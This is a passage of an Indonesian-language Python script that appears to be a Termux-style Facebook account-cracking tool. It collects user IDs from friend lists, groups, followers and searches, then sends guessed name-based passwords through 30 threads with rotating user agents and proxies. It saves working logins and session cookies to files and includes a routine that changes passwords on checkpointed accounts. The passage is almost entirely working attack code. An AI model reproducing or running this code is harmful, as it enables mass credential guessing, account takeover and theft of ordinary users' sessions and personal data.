        exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style="{color_panel}")))
    elif HaHi in["LAIN","Lain","lain"]:
        Lain(cookie).menu()
    else:
        exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style="{color_panel}")))


def file_cp():
	dirs = os.listdir('CP')
	for file in dirs:
		prints(Panel(f"""{M2}{(file)}",width=80, style=f"{color_panel}"""))
	try:
		prints(Panel(f"""Copy Nama File Di Atas Kemudian Tempel Di Bawah Ini Contoh : {day}.txt""",width=80, style=f"{color_panel}"))
		opsi()
	except IOError:
		prints(Panel(f"""Tidak Ada File Untuk Di Cek Silahkan Crack Dulu""",width=80, style=f"{color_panel}"))
		exit()

def opsi():
	CP = ("CP/")
	romi = console.input(f" {H2}• {P2}Tempelkan Sini : ")
	if romi == "":
		Console().print(f"[bold cyan]   ╰─>[bold red] Isi Yang Benar""",width=80, style=f"{color_panel}")
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit(Console().print(Panel(f"""[bold cyan]   ╰─>[bold red] Nama File {(romi)} Tidak Di Temukan""",width=80, style=f"{color_panel}")))
	prints(Panel(f"""[bold white]Sebelum Melanjutkan Hidupkan/Matikan Mode Pesawat""",width=80, style=f"{color_panel}"))
	pw= console.input(f" {H2}• {P2}Ubah Password Y/T: ")
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		Console().print(panel("""[bold white] Masukan Password Baru""", width=80, style={"color_panel"}))
		pw2=console.input(f" {H2}• {P2}PW Baru : ")
		if len(pw2) <= 5:
			Console().print(Panel(f"""[bold white]Sandi Minimal 6 Karakter""",width=80, style={"color_panel"}))
		else:
			pwbaru.append(pw2)
	prints(Panel(f"""[bold white]Total akun : [bold green]{str(len(file_cp))}""",width=80, style={"color_panel"}))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		Console().print(Panel(f"""[bold white][{(str(nomor))}] Cek Sesi Akun = {akun}""",width=80,style=f"bold cyan"));jeda(0.10)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue

data = {}
data2 = {}
def mengecek(user,pw):
    color_ok = []
    global loop,ubah_pass,pwbaru
    session=requests.Session()
    ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
    url = "https://mbasic.facebook.com"
    session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pw})
    urlPost=session.post(url+link.get("action"),data=data)
    response=bs4.BeautifulSoup(urlPost.text, "html.parser")
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
        else:
            print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
            open('OK/OK-%s.txt'%(day), 'a').write(" %s|%s\n" % (user,pw))
    elif "checkpoint" in session.cookies.get_dict():
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url+link2.get("action"),data=data2)
        response2=bs4.BeautifulSoup(an.text,"html.parser")
        cek=[cek.text for cek in response2.find_all("option")]
        number=0
        print("\r%s%s \033[0m [+] Terdapat %s%s%s \033[0mOpsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "ubah_sandi" in ubah_pass:
                    dat,dat2={},{}
                    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
                    for x in response("input"):
                        if x.get("name") in but:
                            dat.update({x.get("name"):x.get("value")})
                    ubahPw=session.post(url+link2.get("action"),data=dat).text
                    resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
                    link3=resUbah.find("form",{"method":"post"})
                    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
                    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
                        for b in resUbah("input"):
                            dat2.update({b.get("name"):b.get("value")})
                        dat2.update({"password_new":"".join(pwbaru)})
                        an=session.post(url+link3.get("action"),data=dat2)
                        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                        print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
                        open('OK/OK-%s.txt' %(day), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
                else:
                    print("\r%s%s \033[0m\x1b[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login		"%(H,til))
                    tree = Tree(" ",guide_style=f"{color_ok}")

def crack_file():
	try:vin = os.listdir('/sdcard/RUDAL-DUMP/')
	except FileNotFoundError:
		print(' [+] File Tidak Ditemukan ')
		time.sleep(2)
		exit()
	if len(vin)==0:
		print(' [+] Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		exit()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/RUDAL-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f' %s. %s [ %s Idz ]'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' [+] %s. %s [ %s Idz] '%(cih,isi,len(hem)))
		geeh = input(' [+] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f' [+] Pilih Yang Bener Kontol ')
			time.sleep(3)
			exit()
		try:lin = open('/sdcard/RUDAL-DUMP/'+geh,'r').read().splitlines()
		except:
			print(' [+] File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			exit()
		for xid in lin:
			id.append(xid)
		setting()

def Dump_Pencarian(url):
    try:
        data = parser(ses.get(str(url)).text,'html.parser')
        for z in data.find_all("td"):
            namp = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(z))
            for uid,nama in namp:
                if "profile.php?" in uid:uid = re.findall("id=(.*)",str(uid))[0]
                elif "<span" in nama:nama = re.findall("(.*?)\<",str(nama))[0]
                if uid+"<=>"+nama in tampung:pass
                else:tampung.append(uid+"<=>"+nama)
                console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
        for x in data.find_all("a",href=True):
            if "Lihat Hasil Selanjutnya" in x.text:
                Dump_Pencarian(x.get("href"))
    except:pass


def Dump_Email(user,format,limit):
    try:
        for z in range(int(limit)):
            if len(user.split()) > 1:
                email = str(user.split()[0])+str(user.split()[1])+str(z)+str(format)+"<=>"+str(user.split()[0])+" "+str(user.split()[1])
            else:
                email = str(user)+str(z)+str(format)+"<=>"+str(user)
                if email in tampung:pass
                else:tampung.append(email)
    except:pass
#-----------------[ CRACK GRUP ]-----------------# 
def crack_group():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		Console().print("[bold cyan]   ╰─>[bold red] Cookies Kadaluarsa ")
		time.sleep(5)
		login()
	Console().print(panel('[bold white]Pastikan Id Grup Bersifat Publik ,Dump Id Grup Mungkin Sangat Lambat',subtitle="╭───", subtitle_align="left",width=80,style=f"bold cyan"))
	url = Console().input(f"[bold cyan]   ╰─> ")
	kocak("https://mbasic.facebook.com/groups/"+url,cokies)
	print("\r")
	setting()

def kocak(url,cokies):
	data = parser(ses.get(url,cookies={"cookie": cokies}).text, "html.parser")
	judul = re.findall("<title>(.*?)</title>",str(data))[0]
	if str(judul) == 'Use basic mode':
		Console().print("[bold cyan]   ╰─>[bold red] Cokies Berada Dalam Mode Free");exit()
	if str(judul) == 'Epsilon':
		Console().print("[bold cyan]   ╰─>[bold red] Cokies Tidak Dpt Mengakses Grup");exit()
	if str(judul) == 'Kesalahan':
		Console().print("[bold cyan]   ╰─>[bold red] Cokies Yg Anda Masukan Salah");exit()
	if str(judul) == 'Masuk Facebook' or str(judul) == 'Masuk Facebook | Facebook' or str(judul) == 'Masuk ke Facebook' or str(judul) == 'Log in to Facebook':
		Console().print("[bold cyan]   ╰─>[bold red] Cokies Mokad");exit()
	else:
		for isi in data.find_all("h3"):
			for ids in isi.find_all("a",href=True):
				if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
				else:
					if ids.text==judul:pass
					else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
				if uid+"|"+nama in id:pass
				else:id.append(uid+"|"+nama)
				print('\r [+] Mengumpulkan %s Id'%(len(id)),end='')
		for x in data.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in x.text:
				kocak("https://mbasic.facebook.com"+x.get("href"),cokies)
			
###----------[ DUMP PENGIKUT ]---------- ###
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cookie = open('.cok.txt','r').read()
	except IOError:
		Console().print("[bold cyan]   ╰─>[bold red] Cookies Kadaluarsa ")
		time.sleep(5)
		login()
	ses = requests.Session()
	Console().print(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",subtitle="╭───", subtitle_align="left",width=80,padding=(0,7),style=f"bold cyan"))
	user = Console().input("[bold cyan]   ╰─>[bold red] Masukan Id : ")
	if user.isdigit():
		url = (f"https://mbasic.facebook.com/profile.php?id={user}&v=followers")
	else:
		url = (f"https://mbasic.facebook.com/{user}?v=followers")
	try:
		link = ses.get(url, cookies={"cookie": cookie}).text
		if "Halaman Tidak Ditemukan" in link:
			Console().print("[bold cyan]   ╰─>[bold red] Pengguna Dengan User Id {user} Tidak Ditemukan")
			time.sleep(2);exit()
		elif "Anda Diblokir Sementara" in link:
			Console().print("[bold cyan]   ╰─>[bold red] Akun Anda Di Batasin Sementara")
			time.sleep(2);exit()
		elif "Konten Tidak Ditemukan" in link:
			Console().print("[bold cyan]   ╰─>[bold red] Pengguna Dengan User Id {user} Tidak Ditemukan")
			time.sleep(2);exit()
		else:
			dump_followers(url, cookie)
	except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout) as e:
		print(" [+] Tidak Ada Koneksi Internet, Periksa Kembali Koneksi Anda")
		time.sleep(3);exit()
	print("\r")
	setting()


def dump_followers(link, cookie):
	try:
		url = ses.get(link, cookies={"cookie": cookie}).text
		data = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', str(url))
		for user in data:
			if "profile.php?" in user[0]:
				id.append(re.findall("id=(.*?)&amp;eav", user[0])[0]+'|'+user[1])
			else:
				id.append(re.findall("(.*?)\?eav", user[0])[0]+'|'+user[1])
			Console().print(f"[bold cyan]   ╰─>[bold green] Sedang Mengumpulkan {str(len(id))} Id...", end='\r')
			time.sleep(000000.003)
		if "Lihat Selengkapnya" in url:
			dump_followers("https://mbasic.facebook.com"+parser(url, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), cookie)
	except:pass
 
 
 
 
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	Console().print(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Lihat Hasil OK[/]           [bold white][[bold cyan]02[/][bold white]][/] [bold white]Lihat Hasil CP[/]',subtitle="╭───", subtitle_align="left",width=80,padding=(0,11),title=f"[bold white][/][bold green]List Menu Cek[/][bold white][/]",style=f"bold cyan"))
	kz = Console().input(f"[bold cyan]   ╰─> ")
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
			time.sleep(3)
			exit()
		if len(vin)==0:
			Console().print("[bold cyan]   ╰─>[bold red] Anda Tidak Memiliki Hasil CP ")
			time.sleep(4)
			exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					Console(width=80, style="bold cyan").print(panel('[bold white]['+nom+'] '+isi+' [bold yellow] '+str(len(hem))+' Account '+x))
				else:
					lol.update({str(cih):str(isi)})
					Console(width=80, style="bold cyan").print(panel('[bold white]['+str(cih)+'] '+isi+' [bold yellow] '+str(len(hem))+' Account '+x))
			geeh = Console(width=80, style="bold cyan").input(f'[bold cyan]   ╰─> ')
			try:geh = lol[geeh]
			except KeyError:
				Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh ")
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
				time.sleep(4)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				Console(width=80, style="bold cyan").print(panel(f'[bold yellow] ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'))
				nocp +=1
			Console().input('[bold yellow][ Klik Enter For Exit ]')
			exit()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
			time.sleep(4)
			exit()
		if len(vin)==0:
			Console().print("[bold cyan]   ╰─>[bold red] Anda Tidak Mempunyai File OK ")
			time.sleep(4)
			exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					Console(width=80, style="bold cyan").print(panel('[bold white]['+nom+'] '+isi+' [bold yellow] '+str(len(hem))+' Account '+x))
				else:
					lol.update({str(cih):str(isi)})
					Console(width=80, style="bold cyan").print(panel('[bold white]['+str(cih)+'] '+isi+' [bold yellow] '+str(len(hem))+' Account '+x))
			geeh = Console().input("[bold cyan]   ╰─> ")
			try:geh = lol[geeh]
			except KeyError:
				Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh")
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
				time.sleep(4)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				Console(width=80, style="bold cyan").print(panel(f'[bold green] ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'))
				nocp +=1
			Console().input('[bold yellow][ Klik Enter For Exit ]')
			exit()
	else:
		Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh")
		exit()
  
tampung=[]

def publikv2():
	with requests.Session() as ses:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
				
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		a = input('└──[ masukan id target: ')
		filetex = input(f" [+] Nama File Dump  : ")
		rspd  = ('/sdcard/RUDAL-DUMP/' + filetex + '.txt').replace(' ', '_')
		koli = open(rspd, 'w')
		try:
			params = {
			"access_token": token, 
			"fields": "name,friends.fields(id,name,birthday)"
			}
			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
			for c in b["friends"]["data"]:
				id.append(c["id"]+"|"+c["name"])
				koli.write(c['id']+'|'+c['name']+ '\n')
				print('\r  Mengumpulkan %s Id'%(len(id)),end='')
				time.sleep(0.0050)
			print(f"{kun}╭────────────────────────────────────────────{puti}")
			print('└──[ Total Idz : {}'.format(len(id)))
			exit()
		except Exception as e:
			print(e)

#-------------------[ CRACK-PUBLIK-MASSAL]----------------#



def publik():
	with requests.Session() as ses:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()		
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		a = input('└──[ masukan id target: ')
		try:
			params = {
			"access_token": token, 
			"fields": "name,friends.fields(id,name,birthday)"
			}
			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
			for c in b["friends"]["data"]:
				id.append(c["id"]+"|"+c["name"])
			print(f"{kun}╭────────────────────────────────────────────{puti}")
			print('└──[ Total Idz : {}'.format(len(id)));setting()
		except Exception as e:
			print(e)
#-------------------[ CRACK-PUBLIK ]----------------#
def massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		Console(width=80, style="bold cyan").print(Panel('\t[bold yellow] Mau Berapa Target Yang Mau Di Crack',subtitle="╭───", subtitle_align="left", title="[bold green]>[hot_pink2] (Crack Masal) [bold green]<"))
		jum = int(input(f"{O}   ╰─> "))
	except ValueError:
		Console().print("[bold cyan]   ╰─>[bold red] Wrong input ")
		exit()
	if jum<1 or jum>80:
		Console().print("[bold cyan]   ╰─>[bold red] Pertemanan Tidak Publik  ")
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		Console(width=80,style="bold cyan").print(panel('\t[bold yellow] Masukkan Target ke '+str(yz)+'',subtitle="╭───", subtitle_align="left"))
		kl = Console().input(f'[bold cyan]   ╰─> ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			Console().print("[bold cyan]   ╰─>[bold red] Unstable Signal ")
			exit()
	try:
		Console(width=80,style="bold cyan").print(panel("""[bold yellow] Total Id Target Yang Terkumpul""",subtitle="╭───", subtitle_align="left"))
		Console().print('[bold cyan]   ╰─> [bold green]'+str(len(id)))					  
		setting()
	except requests.exceptions.ConnectionError:
		print(f'')
		print(' [+] Unstable Signal ')
		exit()
	except (KeyError,IOError):
		print(f' [+] Pertemanan Tidak Public ')
		time.sleep(3)
		exit()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
    Console().print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack akun Old [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Akun New [/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Akun Random [[bold green]Recommended[bold white]][/]', title="[bold green] PILIH",width=80,style=f"{color_panel}"))
    hu = console.input(f" {H2}• {P2}Masukan : ")
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        print(' [+] Pilih Yang Bener Sayang ')
        exit()
    Console().print(Panel(f'[bold yellow]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',title=f"[bold green]Setting Cek Apk",width=80,style=f"{color_panel}"))
    joki = console.input(f" {H2}• {P2}Masukan : ")
    if joki in ['']:
        print(' [+] Pilih Yang Bener Kontol ')
        exit()
    elif joki in ['y','Y']:
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    Console().print(Panel(f'[bold yellow]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
    joki = console.input(f" {H2}• {P2}Masukan : ")
    if joki in ['']:
        print(' [+] Pilih Yang Bener Kontol ')
        exit()
    elif joki in ['y','Y']:
        gabriel.append('ya')
    else:
        gabriel.append('no')
    Console().print(Panel(f'[bold yellow]Apakah Anda Ingin Mengunakan UA Manual Untuk Melakukan Crack Account ? Y/T',title=f"[bold green]Setting User-Agent",width=80,style=f"{color_panel}"))
    uatambah = console.input(f" {H2}• {P2}Masukan : ")
    if uatambah in ['y','Ya','ya','Y']:
        ualuh.append('ya')
        bzer = console.input(f" {H2}• {P2}Masukan UA : ")
        ualu.append(bzer)
    else:
        ualuh.append('tidak')
    passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	bi = random.choice([u,k,kk,b,h,hh])
	print('')
	urut = []
	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=40,title=f"[bold green]OK SAVE",style="bold green"))
	urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=40,title=f"[bold yellow]CP SAVE",style="bold yellow"))
	wa.print(Columns(urut))
	Console().print(Panel(f'\t[bold yellow]hidup/matikan Mode Pesawat Setiap 5 menit',title=f"[bold green]Informasi",width=80,style=f"{color_panel}"))
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = ['anjing123','sayangku','maling123']
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'1234567')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'1234567')
						pwv.append(frs+'12345678')
						pwv.append(frs+'123456789')
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'metode_api' in method:
					pool.submit(metode_api,idf,pwv)
				else:
					pool.submit(metode_api,idf,pwv)
		print('')
	Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
	Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
	Console().print(Panel(' [bold green]Lanjut Crack Kembali ?  Y/T  ',width=80,style=f"{color_panel}"))
	li = console.input(f" {H2}• {P2}pilih : ")
	if li in ['Y','y']:
		license()
	else:
		Console().print(f"[bold cyan]   ╰─> [bold yellow]God Bye Kawan")
		time.sleep(2)
		exit()

#--------------------[ METODE VALIDATE ]-----------------#
def metode_api(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{H2} • {bo}CRACK[bold green] {loop}/{len(id)} [bold white]OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			hst = 'iphone.facebook.com'
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=607187076044599&kid_directed_site=0&app_id=607187076044599&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fclient_id%3D607187076044599%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fpergikuliner.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D90447ac345e71ee7b3f3fe074078ad82078d27a0eb62a266%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6321ea45-1edf-459d-b7ba-f3006d4e5264%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpergikuliner.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D90447ac345e71ee7b3f3fe074078ad82078d27a0eb62a266%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			ppp = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			ppo = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,cookies={'cookie':koki},allow_redirects=True)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=80, style='bold yellow', title='CP')
					cetak(statuscp1)
					os.popen('play-audio c.mp3')
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=80, style='bold yellow', title='CP')
					cetak(statuscp1)
					os.popen('play-audio c.mp3')
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=80, style='bold green', title='OK')
					cetak(statusok1)
					os.popen('play-audio o.mp3')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
